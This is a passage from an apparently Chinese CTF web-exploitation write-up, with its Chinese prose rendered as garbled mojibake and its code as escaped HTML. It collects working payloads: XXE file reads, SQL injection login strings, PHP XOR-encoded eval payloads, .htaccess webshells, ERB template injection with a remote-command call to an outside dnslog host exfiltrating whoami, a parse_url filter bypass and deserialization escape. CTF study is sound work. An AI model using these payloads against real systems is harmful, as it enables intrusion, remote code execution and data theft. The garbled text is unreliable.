\u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;email\u0026gt;\u0026amp;xxe;\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;\u0026amp;xxe;\u0026lt;/group\u0026gt; \u0026lt;intro\u0026gt;\u0026amp;xxe;\u0026lt;/intro\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/users\u0026gt; è¿™é‡ŒåŠ çš„introæ˜¯èƒ½è¯»å…¨éƒ¨çš„ï¼Œä½†æ˜¯è¢«wafäº†ï¼Œç¼–ç ç»•è¿‡\n1 iconv -f utf8 -t utf-16 2.xml\u0026gt;1.xml [MRCTF2020]Ezaudit php_mt_seedçˆ†ç§å­\nå…ˆå°†å¯†é’¥è½¬æ¢\n1 2 3 4 5 6 7 8 9 10 11 str1=\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; str2=\u0026#39;KVQP0LdJKRaV3n9D\u0026#39; str3 = str1[::-1] length = len(str2) res=\u0026#39;\u0026#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+\u0026#39; \u0026#39;+str(j)+\u0026#39; \u0026#39;+\u0026#39;0\u0026#39;+\u0026#39; \u0026#39;+str(len(str1)-1)+\u0026#39; \u0026#39; break print(res) 1 ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 ç„¶åæ ¹æ®é¢˜ç›®é€»è¾‘ç®—ç§é’¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php mt_srand(1775196155); //å…¬é’¥ function public_key($length = 16) { $strings1 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $public_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } //ç§é’¥ function private_key($length = 12) { $strings2 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $private_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } echo public_key(); echo private_key(); ?\u0026gt; ç‰ˆæœ¬è¦æ˜¯å‰ä¸‹ç®—ç§å­çš„ç‰ˆæœ¬\nç„¶åä¸‡èƒ½å¯†ç ç™»å…¥\n1 2 3 crispr 1\u0026#39; or true# XuNhoueCDCGc [BSidesCF 2019]SVGMagic åˆ©ç”¨svgæ ‡ç­¾æ¥è¯»flag\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///proc/self/cwd/flag.txt\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg height=\u0026#34;200\u0026#34; width=\u0026#34;1000\u0026#34;\u0026gt; \u0026lt;text x=\u0026#34;10\u0026#34; y=\u0026#34;20\u0026#34;\u0026gt;\u0026amp;file;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; /proc/self/cwdè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹è¿è¡Œçš„æ–‡ä»¶\n[ISITDTU 2019]EasyPHP 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $_ = @$_GET[\u0026#39;_\u0026#39;]; if ( preg_match(\u0026#39;/[\\x00- 0-9\\\u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops\\x7F]+/i\u0026#39;, $_) ) die(\u0026#39;rosÃ© will not do it\u0026#39;); if ( strlen(count_chars(strtolower($_), 0x3)) \u0026gt; 0xd ) die(\u0026#39;you are so close, omg\u0026#39;); eval($_); ?\u0026gt; 1 2 3 \\x00- 0-9 åŒ¹é…\\x00åˆ°ç©ºæ ¼(\\x20)ï¼Œ0-9çš„æ•°å­— \u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops åŒ¹é…è¿™äº›å­—ç¬¦ \\x7F åŒ¹é…DEL(\\x7F)å­—ç¬¦ ä¸‹é¢è¿™ä¸ªä¼šç»Ÿè®¡ç”¨è¿‡çš„ä¸åŒå­—ç¬¦ï¼Œè¶…è¿‡13ä¸ªè¢«waf\nåˆ©ç”¨å­—ç¬¦ä¸²å¼‚æˆ–\nå…ˆç¡®å®šè‡ªå·±æƒ³æ‰§è¡Œçš„è¯­å¥ï¼Œæ¯”å¦‚phpinfoï¼Œç„¶åå®šä¸€ä¸ªå‚è€ƒå­—ç¬¦ä¸²ï¼Œè®©phpinfoå’Œå®ƒå¼‚æˆ–ï¼Œå°±å¯ä»¥å¾—åˆ°æƒ³è¦çš„è¾“å…¥ï¼Œå¦‚æœå¾—åˆ°çš„ç»“æœä¸ç¬¦åˆè¦æ±‚ï¼Œå†å¾®è°ƒå‚è€ƒå­—ç¬¦ä¸²\n1 2 3 4 5 6 p:%8f^%ff h:%97^%ff i:%96^%ff n:%91^%ff f:%99^%ff o:%90^%ff è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 target = \u0026#34;phpinfo\u0026#34; standard = 0xff dicts = {} for i in target: dicts[i] = hex(ord(i)^standard).replace(\u0026#39;0x\u0026#39;,\u0026#39;%\u0026#39;) res = \u0026#39;\u0026#39; for i in target: res = res+dicts[i] print(res+\u0026#39;^\u0026#39;+\u0026#34;%ff\u0026#34;*len(target)) print(len(set(res+\u0026#39;^\u0026#39;+\u0026#34;%ff\u0026#34;*len(target)))) 1 2 print_r(scandir(\u0026#39;.\u0026#39;)) (%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%9c%9e%91%9b%96%8d^%ff%ff%ff%ff%ff%ff%ff)((%d1^%ff))); è¦æ‰¾åˆ°å¯ä»¥æ›¿æ¢çš„ï¼Œå³åœ¨å†…éƒ¨å¯ä»¥äº’ç›¸å¼‚æˆ–å‡ºæ¥çš„ï¼Œæ‰èƒ½ä½¿é‡å¤çš„å˜å°‘\næœ€å\n1 2 print_r(scandir(\u0026#39;.\u0026#39;)) (%8f%8d%9c%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff^%ff%ff%9b%ff%ff%ff%ff^%ff%ff%91%ff%ff%ff%ff)((%9c%9c%8d%91%9b%9c%8d^%ff%ff%ff%ff%ff%ff%ff^%9b%ff%9c%ff%ff%9b%ff^%8b%ff%8f%ff%ff%91%ff)((%d1^%ff))); 1 2 readfile(end(scandir(\u0026#39;.\u0026#39;))) ((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF))); [ç¾ŠåŸæ¯2020]easyphp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } if(!isset($_GET[\u0026#39;content\u0026#39;]) || !isset($_GET[\u0026#39;filename\u0026#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[\u0026#39;content\u0026#39;]; if(stristr($content,\u0026#39;on\u0026#39;) || stristr($content,\u0026#39;html\u0026#39;) || stristr($content,\u0026#39;type\u0026#39;) || stristr($content,\u0026#39;flag\u0026#39;) || stristr($content,\u0026#39;upload\u0026#39;) || stristr($content,\u0026#39;file\u0026#39;)) { echo \u0026#34;Hacker\u0026#34;; die(); } $filename = $_GET[\u0026#39;filename\u0026#39;]; if(preg_match(\u0026#34;/[^a-z\\.]/\u0026#34;, $filename) == 1) { echo \u0026#34;Hacker\u0026#34;; die(); } $files = scandir(\u0026#39;./\u0026#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== \u0026#34;index.php\u0026#34;) { unlink($file); } } } file_put_contents($filename, $content . \u0026#34;\\nHello, world\u0026#34;); ?\u0026gt; è¿™é‡Œåˆ©ç”¨åˆ°ä¹‹å‰å­¦ä¹ hatccessæ–‡ä»¶çš„ä½œç”¨ï¼ŒåŒ…å«index.php,åæ–œæ ç»•è¿‡æ­£åˆ™\n1 2 3 php_value auto_prepend_fi\\ le .htaccess #\u0026lt;?php system(\u0026#39;ls /\u0026#39;);?\u0026gt;\\ æ¢è¡Œç”¨urlç¼–ç ä¸€ä¸‹\n1 ?filename=.htaccess\u0026amp;content=php_value%20auto_prepend_fi\\%0Ale%20.htaccess%0A%23%3C?php%20system(\u0026#39;ls%20/\u0026#39;);?%3E\\ æˆ–è€…åˆ©ç”¨ä¸Šæ¬¡å­¦åˆ°çš„.htaccessæ–‡ä»¶ç»•è¿‡prceé™åˆ¶çš„æ–¹æ³•å†™é©¬\n1 2 3 php_value pcre.backtrack_limit 0 php_value pcre.jit 0 # \\ 1 ?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\\\u0026amp;f ilename=.htaccess 1 ?filename=php://filter/write=convert.base64-decode/resource=.htaccess\u0026amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw\u0026amp;1=phpinfo(); [FireshellCTF2020]Caas cè¯­è¨€ç¼–è¯‘æŠ¥é”™\nåˆ©ç”¨#includeæ¥æ–‡ä»¶åŒ…å«\n1 #include \u0026#34;/etc/passwd\u0026#34; ç›´æ¥åŒ…å«flag\n1 #include \u0026#34;/flag\u0026#34; [HarekazeCTF2019]Avatar Uploader 1 åŸé¢˜ç»™äº†æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;?php error_reporting(0); require_once(\u0026#39;config.php\u0026#39;); require_once(\u0026#39;lib/util.php\u0026#39;); require_once(\u0026#39;lib/session.php\u0026#39;); $session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY); // check whether file is uploaded if (!file_exists($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]) || !is_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { error(\u0026#39;No file was uploaded.\u0026#39;); } // check file size if ($_FILES[\u0026#39;file\u0026#39;][\u0026#39;size\u0026#39;] \u0026gt; 256000) { error(\u0026#39;Uploaded file is too large.\u0026#39;); } // check file type $finfo = finfo_open(FILEINFO_MIME_TYPE); $type = finfo_file($finfo, $_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); finfo_close($finfo); if (!in_array($type, [\u0026#39;image/png\u0026#39;])) { error(\u0026#39;Uploaded file is not PNG format.\u0026#39;); } // check file width/height $size = getimagesize($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;]); if ($size[0] \u0026gt; 256 || $size[1] \u0026gt; 256) { error(\u0026#39;Uploaded image is too large.\u0026#39;); } if ($size[2] !== IMAGETYPE_PNG) { // I hope this never happens... error(\u0026#39;What happened...? OK, the flag for part 1 is: \u0026lt;code\u0026gt;\u0026#39; . getenv(\u0026#39;FLAG1\u0026#39;) . \u0026#39;\u0026lt;/code\u0026gt;\u0026#39;); } // ok $filename = bin2hex(random_bytes(4)) . \u0026#39;.png\u0026#39;; move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;], UPLOAD_DIR . \u0026#39;/\u0026#39; . $filename); $session-\u0026gt;set(\u0026#39;avatar\u0026#39;, $filename); flash(\u0026#39;info\u0026#39;, \u0026#39;Your avatar has been successfully updated!\u0026#39;); redirect(\u0026#39;/\u0026#39;); è¿™é‡Œç”¨åˆ°finfo_fileæ£€æµ‹å›¾ç‰‡ç±»å‹ï¼Œç„¶ågetimagesizeåˆ¤æ–­æ–‡ä»¶åƒç´ å¤§å°ï¼Œå¹¶ä¸”å†è¿›è¡Œä¸€æ¬¡ç±»å‹åˆ¤æ–­ï¼Œå¦‚æœä¸æ˜¯ png ç±»å‹å°±ç»™å‡º flagï¼Œæˆ‘ä»¬ç›´æ¥010æ„é€ ä¸€ä¸ªåªæœ‰pngå¤´çš„å›¾ç‰‡,å»miscé¢˜é‡Œé¢æ‰¾ä¸€ä¸ªpngå›¾ç‰‡ï¼ŒæŠŠæ–‡ä»¶å¤´ä¸‹é¢å…¨åˆ äº†\n[SCTF2019]Flag Shop ç›®å½•æ‰«ærobots.txt\næºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 require \u0026#39;sinatra\u0026#39; require \u0026#39;sinatra/cookies\u0026#39; require \u0026#39;sinatra/json\u0026#39; require \u0026#39;jwt\u0026#39; require \u0026#39;securerandom\u0026#39; require \u0026#39;erb\u0026#39; set :public_folder, File.dirname(__FILE__) + \u0026#39;/static\u0026#39; FLAGPRICE = 1000000000000000000000000000 ENV[\u0026#34;SECRET\u0026#34;] = SecureRandom.hex(64) configure do enable :logging file = File.new(File.dirname(__FILE__) + \u0026#39;/../log/http.log\u0026#39;,\u0026#34;a+\u0026#34;) file.sync = true use Rack::CommonLogger, file end get \u0026#34;/\u0026#34; do redirect \u0026#39;/shop\u0026#39;, 302 end get \u0026#34;/filebak\u0026#34; do content_type :text erb IO.binread __FILE__ end get \u0026#34;/api/auth\u0026#34; do payload = { uid: SecureRandom.uuid , jkl: 20} auth = JWT.encode payload,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth end get \u0026#34;/api/info\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } json({uid: auth[0][\u0026#34;uid\u0026#34;],jkl: auth[0][\u0026#34;jkl\u0026#34;]}) end get \u0026#34;/shop\u0026#34; do erb :shop end get \u0026#34;/work\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } auth = auth[0] unless params[:SECRET].nil? if ENV[\u0026#34;SECRET\u0026#34;].match(\u0026#34;#{params[:SECRET].match(/[0-9a-z]+/)}\u0026#34;) puts ENV[\u0026#34;FLAG\u0026#34;] end end if params[:do] == \u0026#34;#{params[:name][0,7]} is working\u0026#34; then auth[\u0026#34;jkl\u0026#34;] = auth[\u0026#34;jkl\u0026#34;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth ERB::new(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;#{params[:name][0,7]} working successfully!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;).result end end post \u0026#34;/shop\u0026#34; do islogin auth = JWT.decode cookies[:auth],ENV[\u0026#34;SECRET\u0026#34;] , true, { algorithm: \u0026#39;HS256\u0026#39; } if auth[0][\u0026#34;jkl\u0026#34;] \u0026lt; FLAGPRICE then json({title: \u0026#34;error\u0026#34;,message: \u0026#34;no enough jkl\u0026#34;}) else auth \u0026lt;\u0026lt; {flag: ENV[\u0026#34;FLAG\u0026#34;]} auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth json({title: \u0026#34;success\u0026#34;,message: \u0026#34;jkl is good thing\u0026#34;}) end end def islogin if cookies[:auth].nil? then redirect to(\u0026#39;/shop\u0026#39;) end end ERBæ¨¡æ¿æ³¨å…¥\næ³¨å…¥ç‚¹\n1 2 3 4 5 6 if params[:do] == \u0026#34;#{params[:name][0,7]} is working\u0026#34; then auth[\u0026#34;jkl\u0026#34;] = auth[\u0026#34;jkl\u0026#34;].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\u0026#34;SECRET\u0026#34;] , \u0026#39;HS256\u0026#39; cookies[:auth] = auth ERB::new(\u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;#{params[:name][0,7]} working successfully!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;).result doå’Œnameè¦ç›¸åŒï¼Œæœ‰é•¿åº¦é™åˆ¶7å­—ç¬¦ï¼Œé™¤å»\u0026lt;%=%\u0026gt;åªå‰©ä¸‹ä¸¤ä¸ªå­—ç¬¦ï¼Œåˆ©ç”¨rubyçš„é¢„å®šä¹‰å˜é‡$',å¯ä»¥åŒ¹é…æœ€åä¸€æ¬¡åŒ¹é…å³è¾¹çš„å†…å®¹\n1 2 3 4 unless params[:SECRET].nil? if ENV[\u0026#34;SECRET\u0026#34;].match(\u0026#34;#{params[:SECRET].match(/[0-9a-z]+/)}\u0026#34;) puts ENV[\u0026#34;FLAG\u0026#34;] end è¿™é‡Œè¿˜æœ‰æ­£åˆ™åŒ¹é…ï¼Œéœ€è¦æœ‰SECRETå‚æ•°ä¸”ä¸ºfalse,$'å°±èƒ½è·å–secret\n1 2 \u0026lt;%=$\u0026#39;%\u0026gt; urlç¼–ç ä¸€ä¸‹ï¼š%3C%25%3D%24%27%25%3E ç”šè‡³å¯ä»¥ä¸ä¼ SECRETå‚æ•°\n1 /work?name=%3C%25%3D%24%27%25%3E\u0026amp;do=%3C%25%3D%24%27%25%3E%20is%20working è·å–åˆ°secretå€¼\næ‹¿ç€keyä¼ªé€ \n/shopè·¯ç”±æ”¹cookie\nè¿™é‡Œçœ‹åˆ°æœ‰rceçš„åšæ³•\n1 2 3 4 $a = \u0026#34;mon123\u0026#34; $b = Array[\u0026#34;aaa\u0026#34;,\u0026#34;bbb\u0026#34;,\u0026#34;ccc\u0026#34;] puts \u0026#34;$a: #{$a[0,3]}\u0026#34;//mon puts \u0026#34;$b: #{$b[0,3]}\u0026#34;//[\u0026#34;aaa\u0026#34;,\u0026#34;bbb\u0026#34;,\u0026#34;ccc\u0026#34;] è¿™é‡Œï¼Œ$båŸæœ¬æ˜¯æ•°ç»„ï¼Œä½†æ˜¯å› ä¸ºè¢«æ‹¼æ¥åˆ°äº†å­—ç¬¦ä¸²ä¸­ï¼Œæ‰€ä»¥æ•°ç»„é»˜è®¤çš„ç±»å‹å˜æˆäº†[\u0026quot;aaa\u0026quot;, \u0026quot;bbb\u0026quot;, \u0026quot;ccc\u0026quot;],è¿™æ ·ä¸Šé¢ä»£ç çš„é™åˆ¶ï¼Œä»åŸæœ¬çš„7ä¸ªå­—ç¬¦ï¼Œå˜æˆäº†7ä¸ªæ•°ç»„é•¿åº¦\n1 /work?name[]=\u0026lt;%=system(\u0026#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn\u0026#39;)%\u0026gt;\u0026amp;name[]=1\u0026amp;name[]=2\u0026amp;name[]=3\u0026amp;name[]=4\u0026amp;name[]=5\u0026amp;name[]=6\u0026amp;do=[\u0026#34;\u0026lt;%=system(\u0026#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn\u0026#39;)%\u0026gt;\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34;, \u0026#34;3\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;5\u0026#34;, \u0026#34;6\u0026#34;] is working [N1CTF 2018]eating_cms å…ˆè¿›register.phpæ³¨å†Œåç™»å…¥\nurlå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–\nä¼ªåè®®è¯»ä¸€ä¸‹\n1 user.php?page=php://filter/convert.base64-encode/resource=index function.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 \u0026lt;?php session_start(); require_once \u0026#34;config.php\u0026#34;; function Hacker() { Header(\u0026#34;Location: hacker.php\u0026#34;); die(); } function filter_directory() { $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); // var_dump($query); // die(); foreach($keywords as $token) { foreach($query as $k =\u0026gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } } } function filter_directory_guest() { $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;,\u0026#34;info\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); // var_dump($query); // die(); foreach($keywords as $token) { foreach($query as $k =\u0026gt; $v) { if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); } } } function Filter($string) { global $mysqli; $blacklist = \u0026#34;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\u0026#34;; $whitelist = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;(),_*`-@=+\u0026gt;\u0026lt;\u0026#34;; for ($i = 0; $i \u0026lt; strlen($string); $i++) { if (strpos(\u0026#34;$whitelist\u0026#34;, $string[$i]) === false) { Hacker(); } } if (preg_match(\u0026#34;/$blacklist/is\u0026#34;, $string)) { Hacker(); } if (is_string($string)) { return $mysqli-\u0026gt;real_escape_string($string); } else { return \u0026#34;\u0026#34;; } } function sql_query($sql_query) { global $mysqli; $res = $mysqli-\u0026gt;query($sql_query); return $res; } function login($user, $pass) { $user = Filter($user); $pass = md5($pass); $sql = \u0026#34;select * from `albert_users` where `username_which_you_do_not_know`= \u0026#39;$user\u0026#39; and `password_which_you_do_not_know_too` = \u0026#39;$pass\u0026#39;\u0026#34;; echo $sql; $res = sql_query($sql); // var_dump($res); // die(); if ($res-\u0026gt;num_rows) { $data = $res-\u0026gt;fetch_array(); $_SESSION[\u0026#39;user\u0026#39;] = $data[username_which_you_do_not_know]; $_SESSION[\u0026#39;login\u0026#39;] = 1; $_SESSION[\u0026#39;isadmin\u0026#39;] = $data[isadmin_which_you_do_not_know_too_too]; return true; } else { return false; } return; } function updateadmin($level,$user) { $sql = \u0026#34;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = \u0026#39;$level\u0026#39; where `username_which_you_do_not_know`=\u0026#39;$user\u0026#39; \u0026#34;; echo $sql; $res = sql_query($sql); // var_dump($res); // die(); // die($res); if ($res == 1) { return true; } else { return false; } return; } function register($user, $pass) { global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = \u0026#34;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (\u0026#39;$user\u0026#39;,\u0026#39;$pass\u0026#39;,\u0026#39;0\u0026#39;)\u0026#34;; $res = sql_query($sql); return $mysqli-\u0026gt;insert_id; } function logout() { session_destroy(); Header(\u0026#34;Location: index.php\u0026#34;); } ?\u0026gt; 1 2 3 $keywords = [\u0026#34;flag\u0026#34;,\u0026#34;manage\u0026#34;,\u0026#34;ffffllllaaaaggg\u0026#34;,\u0026#34;info\u0026#34;]; $uri = parse_url($_SERVER[\u0026#34;REQUEST_URI\u0026#34;]); parse_str($uri[\u0026#39;query\u0026#39;], $query); è¿™é‡Œç”¨åˆ°parse_urlçš„è§£ææ¼æ´ï¼Œåœ¨/user.phpå‰é¢åŠ æ–œæ ï¼Œå°±ä¼šè¢«å½“æˆhostè§£æï¼Œè¿”å›falseç»•è¿‡é»‘åå•\n1 //user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg 1 2 3 4 5 6 7 \u0026lt;?php if (FLAG_SIG != 1){ die(\u0026#34;you can not visit it directly\u0026#34;); }else { echo \u0026#34;you can find sth in m4aaannngggeee\u0026#34;; } ?\u0026gt; æç¤ºtemplates/upload.html\nå‘ç°upllloadddd.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php $allowtype = array(\u0026#34;gif\u0026#34;,\u0026#34;png\u0026#34;,\u0026#34;jpg\u0026#34;); $size = 10000000; $path = \u0026#34;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;; $filename = $_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;]; if(is_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;])){ if(!move_uploaded_file($_FILES[\u0026#39;file\u0026#39;][\u0026#39;tmp_name\u0026#39;],$path.$filename)){ die(\u0026#34;error:can not move\u0026#34;); } }else{ die(\u0026#34;error:not an upload fileï¼\u0026#34;); } $newfile = $path.$filename; echo \u0026#34;file upload success\u0026lt;br /\u0026gt;\u0026#34;; echo $filename; $picdata = system(\u0026#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;.$filename.\u0026#34; | base64 -w 0\u0026#34;); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/png;base64,\u0026#34;.$picdata.\u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; if($_FILES[\u0026#39;file\u0026#39;][\u0026#39;error\u0026#39;]\u0026gt;0){ unlink($newfile); die(\u0026#34;Upload file error: \u0026#34;); } $ext = array_pop(explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#39;file\u0026#39;][\u0026#39;name\u0026#39;])); if(!in_array($ext,$allowtype)){ unlink($newfile); } ?\u0026gt; 1 $picdata = system(\u0026#34;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\u0026#34;.$filename.\u0026#34; | base64 -w 0\u0026#34;); è¿™é‡Œå¯ä»¥ç”¨;æ‹¼æ¥å‘½ä»¤æ¥æ‰§è¡Œ\næ‰¾åˆ°å‰é¢èƒ½ä¸Šä¼ çš„åœ°æ–¹\næ–œæ è¢«è¿‡æ»¤äº†ï¼Œcd ..å›ä¸Šçº§ç›®å½•ï¼Œå…¶å®åŠ ä¸ª#å°±ä¸ç”¨base64è§£ç äº†\n[GYCTF2020]Easyphp www.zipä¸‹è½½æºç \n1 2 3 4 function safe($parm){ $array= array(\u0026#39;union\u0026#39;,\u0026#39;regexp\u0026#39;,\u0026#39;load\u0026#39;,\u0026#39;into\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;file\u0026#39;,\u0026#39;insert\u0026#39;,\u0026#34;\u0026#39;\u0026#34;,\u0026#39;\\\\\u0026#39;,\u0026#34;*\u0026#34;,\u0026#34;alter\u0026#34;); return str_replace($array,\u0026#39;hacker\u0026#39;,$parm); } ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php class User{ public $age=null; public $nickname=null; public function __construct(){ $this-\u0026gt;age = \u0026#39;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#39;; $this-\u0026gt;nickname = new Info(); } } class Info{ public $CtrlCase; public function __construct(){ $this-\u0026gt;CtrlCase = new dbCtrl(); } } Class UpdateHelper{ public $sql; public function __construct() { $this-\u0026gt;sql = new User(); } } class dbCtrl{ public $name = \u0026#34;admin\u0026#34;; public $password = \u0026#34;1\u0026#34;; } $o = new UpdateHelper; echo serialize($o); å¾—åˆ°\n1 O:12:\u0026#34;UpdateHelper\u0026#34;:1:{s:3:\u0026#34;sql\u0026#34;;O:4:\u0026#34;User\u0026#34;:2:{s:3:\u0026#34;age\u0026#34;;s:70:\u0026#34;select 1,\u0026#34;c4ca4238a0b923820dcc509a6f75849b\u0026#34; from user where username=?\u0026#34;;s:8:\u0026#34;nickname\u0026#34;;O:4:\u0026#34;Info\u0026#34;:1:{s:8:\u0026#34;CtrlCase\u0026#34;;O:6:\u0026#34;dbCtrl\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:1:\u0026#34;1\u0026#34;;}}}} ååºåˆ—åŒ–ç‚¹åœ¨è¿™é‡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 public function update(){ $Info=unserialize($this-\u0026gt;getNewinfo()); $age=$Info-\u0026gt;age; $nickname=$Info-\u0026gt;nickname; 